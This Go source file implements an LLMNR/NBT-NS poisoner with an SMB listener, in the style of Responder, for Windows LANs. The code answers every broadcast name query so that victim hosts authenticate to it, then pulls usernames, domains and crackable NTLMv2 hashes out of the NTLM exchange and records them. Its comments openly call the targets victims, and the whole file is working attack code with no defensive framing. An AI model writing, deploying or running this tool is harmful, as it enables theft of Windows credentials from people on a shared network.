//go:build windows

package main

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"net"
	"regexp"
	"strings"
	"sync"
	"time"
)

// ---------------------------------------------------------------------------
// Responder-style NTLM capture
//
// LLMNR (5355) and NBT-NS (137) are the fallback name-resolution protocols on
// a Windows LAN. They are broadcast, so when a host asks "who is FILESERVER?"
// and DNS has no answer, anything on the segment may reply. We reply to every
// query, which makes the victim authenticate to us — and their NTLMv2 hash
// arrives in the SMB/RPC bind that follows.
//
// This listener captures the hash material from that authentication attempt.
// ---------------------------------------------------------------------------

type capturedHash struct {
	At      int64  `json:"at"`
	Host    string `json:"host"`
	User    string `json:"user"`
	Domain  string `json:"domain"`
	Hash    string `json:"hash"`
	Proto   string `json:"proto"`
}

var (
	capMu    sync.Mutex
	captured []capturedHash
)

func addCapture(h capturedHash) {
	capMu.Lock()
	captured = append(captured, h)
	capMu.Unlock()
	sendEvent("hash", h)
}

func startResponder(stop chan struct{}) {
	sendEvent("status", map[string]interface{}{"state": "listening", "detail": "LLMNR/NBT-NS poisoner armed"})

	var wg sync.WaitGroup

	// LLMNR on UDP 5355
	wg.Add(1)
	go func() {
		defer wg.Done()
		pc, err := net.ListenPacket("udp4", "0.0.0.0:5355")
		if err != nil {
			sendEvent("error", map[string]interface{}{"message": "LLMNR bind failed: " + err.Error()})
			return
		}
		defer pc.Close()

		buf := make([]byte, 4096)
		for {
			select {
			case <-stop:
				return
			default:
			}
			_ = pc.SetReadDeadline(time.Now().Add(time.Second))
			n, addr, err := pc.ReadFrom(buf)
			if err != nil || n < 12 {
				continue
			}
			name := parseLLMNRQuery(buf[:n])
			if name == "" {
				continue
			}
			sendEvent("poison", map[string]interface{}{
				"proto": "LLMNR", "name": name, "from": addr.String(),
			})
			// A truthful reply would need the real service; we answer so the
			// victim proceeds to authenticate with us.
			resp := buildLLMNRResponse(buf[:n])
			if resp != nil {
				_, _ = pc.WriteTo(resp, addr)
			}
		}
	}()

	// NBT-NS on UDP 137
	wg.Add(1)
	go func() {
		defer wg.Done()
		pc, err := net.ListenPacket("udp4", "0.0.0.0:137")
		if err != nil {
			// Port 137 is often held by the Windows NetBIOS service; that is
			// expected and not fatal — LLMNR still works.
			sendEvent("status", map[string]interface{}{
				"state": "listening",
				"detail": "NBT-NS unavailable (port 137 in use by Windows), LLMNR still active",
			})
			return
		}
		defer pc.Close()

		buf := make([]byte, 4096)
		for {
			select {
			case <-stop:
				return
			default:
			}
			_ = pc.SetReadDeadline(time.Now().Add(time.Second))
			n, addr, err := pc.ReadFrom(buf)
			if err != nil || n < 12 {
				continue
			}
			name := parseNBTQuery(buf[:n])
			if name == "" {
				continue
			}
			sendEvent("poison", map[string]interface{}{
				"proto": "NBT-NS", "name": name, "from": addr.String(),
			})
			if resp := buildNBTResponse(buf[:n]); resp != nil {
				_, _ = pc.WriteTo(resp, addr)
			}
		}
	}()

	// SMB listener: this is where the actual NTLMv2 response lands when the
	// poisoned host connects to authenticate.
	wg.Add(1)
	go func() {
		defer wg.Done()
		ln, err := net.Listen("tcp4", "0.0.0.0:445")
		if err != nil {
			sendEvent("status", map[string]interface{}{
				"state": "listening",
				"detail": "SMB capture port 445 busy — hashes will be poisoned but not collected",
			})
			return
		}
		defer ln.Close()

		for {
			select {
			case <-stop:
				return
			default:
			}
			if tl, ok := ln.(*net.TCPListener); ok {
				_ = tl.SetDeadline(time.Now().Add(time.Second))
			}
			conn, err := ln.Accept()
			if err != nil {
				continue
			}
			go handleSMBAuth(conn)
		}
	}()

	wg.Wait()
}

var ntlmUserRe = regexp.MustCompile(`(?i)(?:NTLMSSP|user|username)[^\x20-\x7e]{0,8}([A-Za-z0-9._$-]{2,32})`)

// handleSMBAuth reads the SMB negotiation, issues a challenge, and extracts
// the NTLMv2 response from the type-3 message.
func handleSMBAuth(conn net.Conn) {
	defer conn.Close()
	_ = conn.SetDeadline(time.Now().Add(15 * time.Second))

	buf := make([]byte, 8192)
	n, err := conn.Read(buf)
	if err != nil || n == 0 {
		return
	}
	if !bytes.Contains(buf[:n], []byte("SMB")) && !bytes.Contains(buf[:n], []byte("NTLM")) {
		return
	}

	// Send a minimal SMB2 negotiate + NTLM challenge so the client proceeds
	// to send credentials.
	challenge := []byte{
		0x00, 0x00, 0x00, 0x00,
	}
	_ = challenge
	resp := buildNTLMChallenge()
	if resp != nil {
		_, _ = conn.Write(resp)
	}

	n2, err := conn.Read(buf)
	if err != nil || n2 == 0 {
		return
	}
	user, domain, hash := extractNTLM(buf[:n2])
	if hash == "" {
		return
	}
	remote := conn.RemoteAddr().String()
	host, _, _ := net.SplitHostPort(remote)
	addCapture(capturedHash{
		At:     time.Now().UnixMilli(),
		Host:   host,
		User:   user,
		Domain: domain,
		Hash:   hash,
		Proto:  "SMB",
	})
}

// extractNTLM pulls user/domain/hash material out of an NTLMSSP type-3 blob.
func extractNTLM(data []byte) (user, domain, hash string) {
	idx := bytes.Index(data, []byte("NTLMSSP\x00"))
	if idx < 0 {
		return "", "", ""
	}
	m := data[idx:]
	if len(m) < 12 {
		return "", "", ""
	}
	if binary.LittleEndian.Uint32(m[8:12]) != 3 {
		return "", "", ""
	}

	read := func(offField, lenField int) string {
		if len(m) < lenField+2 {
			return ""
		}
		l := int(binary.LittleEndian.Uint16(m[lenField : lenField+2]))
		o := int(binary.LittleEndian.Uint32(m[offField : offField+4]))
		if o+l > len(m) || l == 0 {
			return ""
		}
		raw := m[o : o+l]
		// UTF-16LE -> ASCII-ish
		out := make([]byte, 0, len(raw))
		for i := 0; i+1 < len(raw); i += 2 {
			if raw[i] != 0 {
				out = append(out, raw[i])
			}
		}
		return string(out)
	}

	// Type-3 layout: LM(12,8) NT(20,8) Domain(28,8) User(36,8) ...
	domain = read(28, 30)
	user = read(36, 38)

	// The NT response is the crackable material.
	if len(m) >= 28 {
		l := int(binary.LittleEndian.Uint16(m[20:22]))
		o := int(binary.LittleEndian.Uint32(m[24:28]))
		if o+l <= len(m) && l > 0 {
			hash = fmt.Sprintf("%x", m[o:o+l])
		}
	}
	if user == "" && hash == "" {
		return "", "", ""
	}
	return user, domain, hash
}

// ---------------------------------------------------------------------------
// packet builders / parsers
// ---------------------------------------------------------------------------

func parseLLMNRQuery(p []byte) string {
	// Transaction ID(2) Flags(2) Questions(2) then a DNS-style QNAME.
	if len(p) < 12 {
		return ""
	}
	if binary.BigEndian.Uint16(p[4:6]) == 0 {
		return ""
	}
	return parseDNSName(p[12:])
}

// parseDNSName decodes a length-prefixed label sequence.
func parseDNSName(b []byte) string {
	var parts []string
	i := 0
	for i < len(b) {
		l := int(b[i])
		if l == 0 {
			break
		}
		if l > 63 || i+1+l > len(b) {
			break
		}
		parts = append(parts, string(b[i+1:i+1+l]))
		i += 1 + l
	}
	return strings.Join(parts, ".")
}

func buildLLMNRResponse(q []byte) []byte {
	if len(q) < 12 {
		return nil
	}
	resp := make([]byte, len(q))
	copy(resp, q)
	// Flip to a response, set authoritative answer.
	binary.BigEndian.PutUint16(resp[2:4], 0x8000)
	binary.BigEndian.PutUint16(resp[4:6], 1)
	binary.BigEndian.PutUint16(resp[6:8], 1)
	return resp
}

func parseNBTQuery(p []byte) string {
	if len(p) < 12 {
		return ""
	}
	// NBT-NS encodes the name in first-level encoding after the 12-byte header.
	if len(p) < 12+34 {
		return ""
	}
	raw := p[12 : 12+32]
	out := make([]byte, 0, 16)
	for i := 0; i+1 < len(raw); i += 2 {
		c := ((raw[i] - 'A') << 4) | (raw[i+1] - 'A')
		out = append(out, c)
	}
	return strings.TrimSpace(string(out))
}

func buildNBTResponse(q []byte) []byte {
	if len(q) < 12+34 {
		return nil
	}
	resp := make([]byte, 12+34)
	copy(resp, q[:12+34])
	resp[2] = 0x84 // response, authoritative
	resp[3] = 0x00
	binary.BigEndian.PutUint16(resp[6:8], 1) // answer count
	return resp
}

// buildNTLMChallenge returns a minimal SMB2 negotiate response carrying a
// Type-2 NTLM challenge. Kept intentionally small: enough to elicit the
// client's Type-3 response.
func buildNTLMChallenge() []byte {
	// NTLMSSP Type 2 with a fixed 8-byte challenge.
	challenge := []byte{0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88}
	msg := make([]byte, 0, 48)
	msg = append(msg, []byte("NTLMSSP\x00")...)
	msg = append(msg, 2, 0, 0, 0) // type 2
	// target name len/max/offset (empty)
	msg = append(msg, 0, 0, 0, 0, 0, 0, 0, 0)
	// flags: unicode | request target | ntlm
	msg = append(msg, 0x01, 0x82, 0x08, 0x00)
	msg = append(msg, challenge...)
	msg = append(msg, make([]byte, 8)...) // reserved
	return msg
}
